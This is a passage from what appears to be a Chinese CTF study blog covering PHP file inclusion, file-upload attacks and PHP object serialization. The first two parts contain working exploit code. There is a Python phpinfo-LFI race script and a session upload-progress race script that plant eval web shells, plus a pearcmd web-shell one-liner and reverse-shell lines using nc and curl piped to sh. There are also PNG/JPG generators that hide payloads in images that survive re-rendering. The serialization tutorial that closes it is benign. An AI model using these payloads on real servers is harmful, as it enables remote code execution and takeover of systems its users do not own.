&#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\\r&quot;&quot;&quot; % TAG    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\\rContent-Type: text/plain\\r\\r%s-----------------------------7dbff1ded0714--\\r&quot;&quot;&quot; % PAYLOAD    padding=&quot;A&quot; * 5000    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)    #modify this to suit the LFI script       LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\\rUser-Agent: Mozilla/4.0\\rProxy-Connection: Keep-Alive\\rHost: %s\\r\\r\\r&quot;&quot;&quot;    return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)    d = &quot;&quot;    while len(d) &lt; offset:        d += s.recv(offset)    try:        i = d.index(&quot;[tmp_name] =&amp;gt; &quot;)        fn = d[i+17:i+31]    except ValueError:        return None    s2.send(lfireq % (fn, host))    d = s2.recv(4096)    s.close()    s2.close()    if d.find(tag) != -1:        return fncounter=0class ThreadWorker(threading.Thread):    def __init__(self, e, l, m, *args):        threading.Thread.__init__(self)        self.event = e        self.lock =  l        self.maxattempts = m        self.args = args    def run(self):        global counter        while not self.event.is_set():            with self.lock:                if counter &gt;= self.maxattempts:                    return                counter+=1            try:                x = phpInfoLFI(*self.args)                if self.event.is_set():                    break                                if x:                    print &quot;\\nGot it! Shell created in /tmp/g&quot;                    self.event.set()                                except socket.error:                return    def getOffset(host, port, phpinforeq):    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host,port))    s.send(phpinforeq)        d = &quot;&quot;    while True:        i = s.recv(4096)        d+=i                if i == &quot;&quot;:            break        # detect the final chunk        if i.endswith(&quot;0\\r\\n\\r\\n&quot;):            break    s.close()    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)    if i == -1:        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)        print &quot;found %s at %i&quot; % (d[i:i+10],i)    # padded up a bit    return i+256def main():        print &quot;LFI With PHPInfo()&quot;    print &quot;-=&quot; * 30    if len(sys.argv) &lt; 2:        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]        sys.exit(1)    try:        host = socket.gethostbyname(sys.argv[1])    except socket.error, e:        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)        sys.exit(1)    port=80    try:        port = int(sys.argv[2])    except IndexError:        pass    except ValueError, e:        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)        sys.exit(1)        poolsz=10    try:        poolsz = int(sys.argv[3])    except IndexError:        pass    except ValueError, e:        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)        sys.exit(1)    print &quot;Getting initial offset...&quot;,      reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = 1000    e = threading.Event()    l = threading.Lock()    print &quot;Spawning worker pool (%d)...&quot; % poolsz    sys.stdout.flush()    tp = []    for i in range(0,poolsz):        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))    for t in tp:        t.start()    try:        while not e.wait(1):            if e.is_set():                break            with l:                sys.stdout.write( &quot;\\r% 4d / % 4d&quot; % (counter, maxattempts))                sys.stdout.flush()                if counter &gt;= maxattempts:                    break        print        if e.is_set():            print &quot;Woot!  \\m/&quot;        else:            print &quot;:(&quot;    except KeyboardInterrupt:        print &quot;\\nTelling threads to shutdown...&quot;        e.set()        print &quot;Shuttin&#x27; down...&quot;    for t in tp:        t.join()if __name__==&quot;__main__&quot;:    main()\n\nsession文件包含（upload_progress文件上传）有包含点，且PHP_SESSION_UPLOAD_PROGRESS不变时，可以使用此脚本\nsession_upload_progress最初是php为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在session中，此时即使用户没有初始化session，php也会自动初始化session。而且，默认情况下session.uoload_progress.enabled是为on的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化session。\n从上面可以看到，session中一部分数据（session.uoload_progress.enabled）是用户自己控制的。那么我们只要在文件上传的时候，同时post一个恶意字段PHP_SESSION_UPLOAD_PROGRESS，目标服务器的PHP就会自动启用session，session文件将会自动创建。\nimport requestsimport threadingsession=requests.session()sess=&#x27;ctfshow&#x27;url=&quot;http://6eb9a422-f96b-4a44-a67d-0d9f9d3e716f.challenges.ctfer.com:8080/&quot; #靶场地址data1=&#123;        &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php echo &quot;success&quot;;file_put_contents(&quot;/var/www/html/1.php&quot;,&quot;&lt;?php eval(\\\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;&#125;file=&#123;        &#x27;file&#x27;:&#x27;ctfshow&#x27;&#125;cookies=&#123;        &#x27;PHPSESSID&#x27;: sess&#125;def write():        while True:                r = session.post(url,data=data1,files=file,cookies=cookies)def read():        while True:                r = session.get(url+&quot;?file=../../../../../../../tmp/sess_ctfshow&quot;)                if &#x27;success&#x27; in r.text:                        print(&quot;shell 地址为：&quot;+url+&quot;1.php&quot;)                        exit()                        threads = [threading.Thread(target=write),       threading.Thread(target=read)]for t in threads:        t.start()\n\npear文件包含pear模块下有很多php文件，可以利用其中的某个php，分析发现/usr/local/lib/php/PEAR/Command/Install.php存在可利用点\n/usr/local/lib/php/pearcmd.php存在可利用点\n\nargv注册功能开启了就可以使用这种姿势\n可以通过配置文件写入一句话木马\n?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+1.php\n\n其中aaa可以将数据弹出argv，三个➕，四个元素\n远程文件包含这里是结合了上边的日志包含，或者可以理解成远程日志包含\n这里由于题目过滤了符号. 所以我们可以用http://www.ab173.com/net/ip2int.php 将IP转换成纯数字\n\n","tags":["Study","Wen","PHP_include"]},{"title":"Web_4_PHP文件上传","url":"/2022/09/20/web_4/","content":"第一节 php文件上传0x1 php文件上传机制php使用临时文件移动的方式来上传文件，通过$_FILES数组包含文件信息，在PHP脚本处理过程中，对已经存在在临时目录的/tmp/php??????文件使用move_uploaded_file函数来移动到新的位置。\n文件上传信息包含的数组$_FILES数组中，是支持多文件同时上传的。默认情况下，上传的名字为file,所以我们可以在$_FILES[&#39;file&#39;]这个数组中获得，我们可以获得以下信息\n\n$_FILES[&#39;file&#39;][&#39;name&#39;]获得上传文件的原始文件名\n$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]上传的文件在临时目录中的文件名\n$_FILES[&#39;file&#39;][&#39;size&#39;]上传文件的大小，单位为字节\n$_FILES[&#39;file&#39;][&#39;type&#39;]上传文件的类型\n\n0x2 文件上传的例子文件上传表单表单是一种HTML代码，表示向某个地址发送一个或多个数据，数据格式可以分为几种\nget表单数据附加在url后\npost表单将数据附加到http包中，发送的数据是经过url编码过的\nraw表单将数据直接附加到http请求包中，不存在键值对，直接是数据，常见的方式是file_get_contents(&quot;php://input&quot;)这种请求是和post表单互斥的\njson表单类型为application/json，常见于api接口\n文件上传的例子&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;文件上传&lt;/title&gt;  &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;      &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;      &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;    &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;\n\n&lt;?php$tmp_file =  $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];$dist_file = &quot;./upload/&quot;. $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];if(move_uploaded_file($tmp_file,$dist_file))&#123;  echo &quot;文件上传成功&quot;;&#125;else&#123;  echo &quot;文件上传失败&quot;;&#125;?&gt;\n\n\n\n文件上传的成因由于历史原因，早期服务器比较贵，用户上传的文件只能存放在web目录\n0x3 文件上传可能存在的漏洞文件上传本质就是对服务器文件系统写操作，就有可能执行我们写入的恶意代码\n文件上传后缀黑名单过滤某些配置文件为了兼容老版本的php代码，也会解析php3，php5，phtml\nphp文件上传的00截断123.php%00.jpg保存时.jpg会被截断舍弃，但是只有PHP版本小于5.3.4才存在此漏洞\niconv字符转换异常造成截断5.4以上版本已经修复\n文件后缀白名单过滤web服务器解析漏洞IIS解析漏洞Windows系统下一般使用ISS作为web服务器，比较老版本会解析目录名字为xxx.asp等字符构成的目录。\nnginx解析漏洞nginx配置错误\nnginx会将后缀为123.txt/123.php的uri请求匹配到，误认为是php后缀\nApache解析漏洞如果上传1.php被禁止，可以上传1.php.charmersix ，charmersix后缀不识别，就会继续往前识别后缀。\n0x4文件上传高级利用配置文件绕过.htaccess配置文件.user.ini配置文件auto_append_file=1.txt\n使用auto_append_file参数来包含进行当前的php文件一起执行。\n.user.ini自动附加文件时，当前目录必须要有php文件\n配置文件必须要有php文件才能生效\n直接访问首页，即可执行一句话木马\n文件内容检测像&lt;?php , system , eval , $_GET, $_POST如果这些函数被禁用，即文件中带有这些函数的文件都无法上传，我们可以使用cookie传输数据，或者用nc反弹shell\n1.用cookie传输数据\n&lt;?=`$_COOKIE[1]`;\n\n`文件上传，然后cookie传输\necho &quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b&quot;|base64 -d&gt;1.php\n再连接1.php\n\n2.反弹shell\n&lt;?= `nc ip port -e /bin/sh`;&lt;?= `curl curl https://your-shell.com/ip:port |sh`;\n\n3.使用php伪协议，文件包含\nauto_append_file=php://input\n4.日志包含\nauto_append_file=/var/log/nginx/access.log\n注意.user.ini内容的文件名\n文件上传与XSS图片上传getimagesize绕过扫描图片中是否存在高宽，如果存在就认为正常\n#define height 100#define width 100&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;\n\npng二次渲染绕过直接生成一个新图片，清洗掉原来的恶意代码\n这里我们用脚本写一个恶意代码不会被清洗的图片\n&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;2.png&#x27;);  //要修改的图片的路径/* 木马内容&lt;?$_GET[0]($_POST[1]);?&gt; */?&gt;\n\njpg二次渲染绕过&lt;?php    $miniPayload = &quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;;    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;        die(&#x27;php-gd is not installed&#x27;);    &#125;    if(!isset($argv[1])) &#123;        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);    &#125;    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) &#123;        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) &#123;            die(&#x27;Incorrect SOI marker&#x27;);        &#125;        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) &#123;                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) &#123;                    while((!$dis-&gt;eof())) &#123;                        if($dis-&gt;readByte() === 0xFF) &#123;                            if($dis-&gt;readByte !== 0x00) &#123;                                break;                            &#125;                        &#125;                    &#125;                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                &#125; elseif($correctImage) &#123;                    $outStream = $outStreamTmp;                &#125; else &#123;                    break;                &#125;                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;                    die(&#x27;Success!&#x27;);                &#125; else &#123;                    break;                &#125;            &#125;        &#125;    &#125;    unlink(&#x27;payload_&#x27;.$argv[1]);    die(&#x27;Something\\&#x27;s wrong&#x27;);    function checkImage($filename, $data, $unlink = FALSE) &#123;        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    &#125;    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;            if(isset($m[1])) &#123;                $extraBytes = (int)$m[1];            &#125;        &#125;    &#125;    class DataInputStream &#123;        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) &#123;            $this-&gt;binData = &#x27;&#x27;;            $this-&gt;order = $order;            if(!$fromString) &#123;                if(!file_exists($filename) || !is_file($filename))                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);                $this-&gt;binData = file_get_contents($filename);            &#125; else &#123;                $this-&gt;binData = $filename;            &#125;            $this-&gt;size = strlen($this-&gt;binData);        &#125;        public function seek() &#123;            return ($this-&gt;size - strlen($this-&gt;binData));        &#125;        public function skip($skip) &#123;            $this-&gt;binData = substr($this-&gt;binData, $skip);        &#125;        public function readByte() &#123;            if($this-&gt;eof()) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        &#125;        public function readShort() &#123;            if(strlen($this-&gt;binData) &lt; 2) &#123;                die(&#x27;End Of File&#x27;);            &#125;            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) &#123;                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            &#125; else &#123;                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            &#125;            return $short;        &#125;        public function eof() &#123;            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        &#125;    &#125;?&gt;用法  php exp.php a.png\n\n我们来一个jpg二次渲染绕过的专用图片\n\n\n配合文件包含\n\n文件上传最容易出现代码执行和命令执行，且危害巨大\n配置文件.user.ini中，auto_append_file参数不仅可以写文件名，也可以是伪协议和nginx日志\ngetimagesize函数可以通过#define width 100来绕过\npng和jpg二次渲染后，仍可能保留恶意代码\n\n","tags":["Web","Study","PHP_upload"]},{"title":"Web_6_PHP反序列化","url":"/2022/10/20/web_6/","content":"第一节 php基础、类与对象读文档类与对象\n0x1 php中的面向对象在前面的课程中，我们使用的最小命令单元，是函数或者语言结构，我们可以通过某个函数（比如phpinfo）来执行某个操作，这种使用单独函数来完成特定功能的语言模式，我们叫做面向过程编程。面向过程编程方法的优势是代码简单，开发迅速，不足之处就是如果功能、逻辑、数据进行大量的增长，这时候，代码维护难度将会成倍的增加，扩展性、可移植性就大大降低。\n于是以Java为代表的面向对象编程顺势而出，解决了复杂逻辑空间下的编码模式问题，php在最开始的纯面向过程逐步向面向对象模式改进，在保持其一贯的简单易学、编码快速的优势下，同向对象之间取得平衡。\n面向对象的思想面向对象的设计思想主要有\n\n系统中一切事物皆为对象\n对象是属性及其操作的封装体\n对象可按其性质划分为类，对象成为类的实例\n实例关系和继承关系是对象之间的静态关系\n消息传递是对象之间动态联系的唯一形式，也是计算的唯一形式\n方法是消息的序列\n\nphp面向对象的特点面向对象三大特征：封装、继承、多态\n聚类在面向对象的思路上，功能相似的函数集合在一起\n将完成一个共同功能的函数集中起来就是聚类\n封装功能封装，数据封装，供内部各个方法使用\n隔离调用对象从一个蓝图转换到一个可以使用的产品的过程叫做实例化\n俩个实例之间的属性不能互相访问，在对象内部，也不能直接访问外部的变量。\n继承继承可以理解为对象的包含，在php中可以使用extends关键字继承类\n多态在php中是弱类型,在参数传递过程中,可以改变参数的对象类型,作为对象依然是可以传递进去,当同一个参数由不同对象实例传递,那么调用结果就实现不同的状态\n例如：\nclass Command&#123;  function run($var)&#123;    $var-&gt;run();  &#125;&#125;\n\n我们有一个command类，她有一个run方法，会执行参数run方法，然后我们有两个其他对象\nclass Command&#123;  function run ($var)&#123;  $var-&gt;run();  &#125;&#125;class Rabbit&#123;  function run&#123;    echo &quot;兔子跑了&quot;;  &#125;&#125;class Script&#123;  function run()&#123;    echo&quot;脚本已启动&quot;;  &#125;&#125;$command = new Command();$r = new Rabbit();$s = new Script();$command-&gt;run($r);$command-&gt;run($s);\n\n0x2 类与对象类的属性和方法权限在php中，类的属性和方法权限有三个权限，分别为\n\npublic\nprotected\nprivate\n\npublic权限被定义为公有类成员可以在任何地方被访问\n🌰\nclass Command&#123;  public $cmd;&#125;$command = new Command();$command-&gt;cmd=&quot;whoami&quot;;\n\n这里用箭头来指向类的属性，箭头之后，不需要$符号\n也可以使用var来定义类属性,如果使用var定义则默认public权限\nprotected权限被定义为受保护的类成员则可以被其自身以及其子类和父类访问\n🌰\nclass Animal&#123;  protected $color;  function eat()&#123;  &#125;  function sleep()&#123;  &#125;&#125;class Human extends Animals&#123;  public $gender;  function getColor()&#123;    echo $this-&gt;color  &#125;&#125;\n\ncolor属性可以被子类继承并访问\nprivate权限私有属性,只能在类自身中访问,其他位置不能访问,包括继承它的类\n🌰\nclass Animal&#123;  private $color;  function eat()&#123;  &#125;  private function sleep()&#123;  &#125;&#125;class Human extends Animals&#123;  public $gender;  function think()&#123;    &#125;&#125;//正确，类实例可以访问到自身的私有属性$animal = new Animal();echo $animal -&gt;color;//错误,子类实例不能访问父类私有属性$human = new Human();echo $human -&gt;color;//错误,子类实例调用不了父类的私有方法$human-&gt;sleep();\n\n类的属性属性声明是由关键字public、protected或者private开头，然后跟一个普通的变量声明来组成。属性中的变量可以初始化，但初始化的值必须是常数，这里的常数是指PHP脚本在编译阶段时就可以得到其值，而不依赖于运行时的信息才能求值。\n🌰\n&lt;?phpclass Animal&#123;  public $name=&quot;panda&quot;; #初始化  public function eat()&#123;  &#125;  public function sleep()&#123;  &#125;&#125;?&gt;\n\n静态属性指不用实例化类对象，直接通过类名访问的属性或者方法\n声明类属性或方法为静态，就可以不实例化类而直接访问。静态属性不能通过一个类已实例化的对象来访问(但静态方法可以)\n&lt;?phpclass Animal&#123;  public static $color;  function eat()&#123;    //这里直接通过类名调用，不需要实例化    Animal::sleep();  &#125;  private static function sleep()&#123;    return self::$color;    //使用双冒号指向静态属性  &#125;&#125;class Human extends Animal&#123;  public $gender;  function think()&#123;    return parent::$color;    //子类也可以直接访问到父类的静态方法  &#125;&#125;\n\nfinal属性如果代码中有final关键字就不允许子类重写父类,如果子类强制重写父类就会报错\n类的分类前面我们定义类的时候,没有修饰,类也是可以有不同的修饰符号的\n抽象类使用abstract关键字定义抽象类\n定义为抽象的类不能被实例化.任何一个类,如果它里面至少有一个方法是被声明为抽象的,那么这个类就必须被声明为抽象的.被定义为抽象的方法只是声明了其调用方式(参数),不能定义其具体的功能实现.\n继承一个抽象类的时候,子类必须定义父类中的所有抽象方法;另外,这些方法的访问控制必须和父类中的一样(或者更为宽松).例如某个抽象方法被声明为受保护 的,那么子类中实现的方法就应该声明为受保护的或者公有的,而不能被定义为私有的.此外方法的调用方式必须匹配,即类型和所需参数数量必须一致.例如,子类定义了一个可选参数,而父类抽象方法的声明里没有,则两者的声明并无冲突.\n🌰\n&lt;?phpabstract class Animal&#123;  abstract function sleep();&#125;class Human extends Animal&#123;  function sleep()&#123;    echo &quot;in bed&quot;;  &#125;&#125;class Bird extends Animal&#123;  function sleep()&#123;    echo &quot;on tree&quot;;  &#125;&#125;$a = new Human();var_dump($a);\n\n抽象类的作用是保证他的子类都有指定的共同方法,方便外部调用,而不关心内部的具体实现\n总之:\n\n抽象类不能实例化,只能实例化子类\n抽象类可以有具体方法,但至少应该有一个抽象方法\n继承抽象类的子类必须实现抽象类的所有抽象方法\n\n接口使用interface来定义,很像抽象类\n使用接口(interface),可以指定某个类必须实现哪些方法,但不需要定义这些方法的具体内容.其中定义的所有的方法都是空的\n接口中定义的所有方法都必须是公有的,这是接口的特性\n要实现一个接口,使用implements操作符.类中必须实现接口中定义的所有方法,否则会报一个致命错误.类可以实现多个接口,用逗号来分隔多个接口的名称.\n&lt;?phpinterface a &#123;  public function foo();&#125;interface b &#123;  public function bar();&#125;interface c extends a ,b &#123;  public function baz();&#125;class d implements c &#123;  public function foo()&#123;  &#125;  public function bar()&#123;  &#125;  public  function baz()&#123;  &#125;&#125;?&gt;\n\n接口允许继承,实现接口,也允许实现多个接口\ntraitPHP5.4起,PHP实现了一种代码复用的方法,为trait\nTrait 是为类似php单继承语言而备用的一种代码复用机制.Trait 为了减少单继承语言的限制,使开发人员能够自由地在不同层次结构内独立的类中复用method. Trait 和 class组合的语义定义了一种减少复杂性的方式,避免传统多继承和Mixin类相关典型问题.\nTrait 和 Class 相似,但仅仅旨在用细粒度和一致的方式来组合功能. 无法通过Trait 自身来实例化. 它为传统继承增加了水平特性的组合; 也就是说应用的几个Class之间不需要继承.\ntrait 是可以组合的,由多个trait构成一个新的trait\n&lt;?php trait Hello &#123;  public function SayHello()&#123;    echo &#x27;hello&#x27;;  &#125;&#125;trait World &#123;  public function SayWorld()&#123;     echo &#x27;world&#x27;;  &#125;&#125;trait HelloWorld&#123;  use Hello, World;&#125;class MyHelloWorld &#123;  use HelloWorld;&#125;$o = new MyHelloWorld();$o -&gt; SayHello();$o -&gt; SayWorld();?&gt;\n\ntrait配合接口或者抽象类\n匿名类匿名类是为了解决临时实现某个抽象类或者接口类实例用的\n匿名类我们关注的点是临时执行下我们自定义的run方法,这个类其他地方也用不到,所以我们不需要给它专门起名定义,占用代码行数,反正Command类的run方法关心的是传入的对象有没有run方法,而不关心传入的对象叫什么名字. \n🌰\n&lt;?phpclass Command &#123;  function run ($var)&#123;    return $var -&gt; run();  &#125;&#125;$command = new Command();echo $command-&gt;run (new class&#123;  function run()&#123;    return &quot;临时用的所以不起名字&quot;  &#125;&#125;); ?&gt;\n\n对象序列化所有PHP里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示.unserialize()函数能够重新把字符串变回PHP原来的值. 序列化一个对象将会保存对象的所有变量,但不会保存对象的方法,只会保存类的名字.\n对象序列化 serialize方法,返回字符串,此字符串包含了表示value的字节流,可以存储于任何地方,有利于存储或传递PHP的值,同时不丢失其类型和结构.\n对象反序列化 unserialize方法,对单一的已序列化的变量进行操作,将其转换回PHP值.\n\n 字符串和数字都可以序列化/反序列化\n\n第二节 php的序列化与反序列化0x3 序列化与反序列化序列化序列化的本质是将内存中的对象,转换为可以保存,传输的字符\n在php中,我们不仅可以序列化对象的实例,也可以序列化一些基本类型\n🌰\n&lt;?php$name = &quot;charmersix&quot;;echo serialize($name);?&gt;\n\n可以得到序列化字符串\n\n其中第一个s表示被序列化的对象类型,s指string\n后面紧跟一个冒号和数字,表示属性的长度,后面冒号+双引号表示属性的内容\n我们也可以尝试序列化一个我们自定义的类\n&lt;?phpclass Animal&#123;  public $name;  public function eat()&#123;    return &quot;i can eat&quot;;  &#125;  public function sleep()&#123;    return &quot;i can sleep&quot;;  &#125;&#125;$a = new Animal();echo serialize ($a);\n\n可以看到一个对象被序列化以后的字符串\nO:6:&quot;Animal&quot;:1:&#123;s:4:&quot;name&quot;;N;&#125;\n\n一个对象，名字是6个字符，内容是Animal，有一个属性，是个字符串，名字由4个字符组成，是name，没有值，是Null\n属性是有权限的，当属性权限为protected时,可以看到序列化结果为:\nO:6:&quot;Animal&quot;:1:&#123;s:7:&quot;*name&quot;;N;&#125;O%3A6%3A%22Animal%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3BN%3B%7D\n\n属性名字前加了*表示这个属性是protected权限,其实这里还有不可见字符,可以看到长度是7\n那么增加的不可见字符是什么呢,就是\\x00*\\x00,三个字符加上name的4个字符,刚好是7字符,可以通过urlencode发现不可见字符,所以遇到非public属性进行序列化时,一定不要直接复制输出,除非进行了urlencode编码\n如果是私有属性反序列化后是类名+属性\nO:6:&quot;Animal&quot;:1:&#123;s:12:&quot;Animalname&quot;;N;&#125;O%3A6%3A%22Animal%22%3A1%3A%7Bs%3A12%3A%22%00Animal%00name%22%3BN%3B%7D\n\n可以看到我们虽然序列化的是子类,但是会把父类的私有属性也序列化进去,甚至可以吧trait看成一种特殊的继承类,也会被序列化进去\n抽象类和接口都无法序列化,但是匿名类可以序列化\n对象的属性也可以为对象\n🌰\n&lt;?phptrait action&#123;  public $move = &quot;step&quot;;&#125;class Animal&#123;  public $name;  function eat()&#123;    echo &quot;i can eat&quot;;  &#125;  function sleep()&#123;    echo &quot;i can sleep&quot;;  &#125;&#125;class Human extends Animal&#123;  public $gender;  use action;  function think()&#123;  &#125;&#125;$a = new Animal();$h = new Human();$a -&gt; new = $h;echo serialize ($a);\n\n这时候，序列化后的字符串为\nO:6:&quot;Animal&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;new&quot;;O:5:&quot;Human&quot;:3:&#123;s:6:&quot;gender&quot;;N;s:4:&quot;name&quot;;N;s:4:&quot;move&quot;;s:4:&quot;step&quot;;&#125;&#125;\n\n一个对象,名字是6个字符,内容是Animal,有1个属性,属性名字是字符串,长度为4,内容name,值是一个对象,对象名字是5个字符,内容是Human,包含三个属性,分别是6个字符的gender,4个字符的name,以及4个字符的move\n总结:\n序列化就是对一个对象的所有属性,用字符串描述出来,方便反序列化时还原\n反序列化反序列化是对已经序列化后的字符串,重新构造出一个对象使用unserialize\n🌰\n&lt;?phpclass Animal&#123;  public $name = &quot;panda&quot;;  function eat()&#123;    echo &quot;i can eat&quot;;  &#125;  function sleep()&#123;    echo &quot;i can sleep&quot;;  &#125;&#125;$a = new Animal();//echo serialize ($a);//得到序列化以后的结果$p = &#x27;O:6:&quot;Animal&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;&#125;&#x27;;$panda = unserialize ($p);echo $panda -&gt;name;\n\n可以看到输出了一个panda\nphp对于不识别的类被反序列化后,会给自动分配一个类名,这个类名就是__PHP_Incomplete_Class\n总结:\n\n反序列化时,必须反序列化已经存在的类\nunserialize函数的参数,必须是字符串\nunserialize函数返回的是转换之后的值,可为integer、float、string、array、或object，如果传递的字符串不可解序列化，则返回false\n\n这里说的存在的类，是指在PHP脚本或所包含的文件中，有class关键字定义的类\n0x4 PHP中的魔术方法在php中，存在众多的魔法方法，是每个对象默认都有的方法，不管定义不定义，都会存在\n首先总结一下干货, 方便食用\n__construct：在创建对象时候初始化对象，一般用于对变量赋初值。__destruct：和构造函数相反，当对象所在函数调用完毕后执行。__call：当调用对象中不存在的方法会自动调用该方法。__get()：获取对象不存在的属性时执行此函数。__set()：设置对象不存在的属性时执行此函数。__toString：当对象被当做一个字符串使用时调用。__sleep：序列化对象之前就调用此方法(其返回需要一个数组)__wakeup：反序列化恢复对象之前调用该方法__isset()：在不可访问的属性上调用isset()或empty()触发__unset()：在不可访问的属性上使用unset()时触发__invoke() ：将对象当作函数来使用时执行此方法\n\nsleep和wakeup方法魔法方法是以两个下划线开头的方法\n其中__sleep方法是序列化的时候，自动调用的方法\nserialize()函数会检查类中是否存在一个魔术方法__sleep()如果存在,该方法会被调用,然后才执行序列化操作.此功能可以用于清理对象,并返回一个包含对象中所有应被序列化的变量名称数组.\n🌰\n&lt;?phpclass Animal&#123;  public $name = 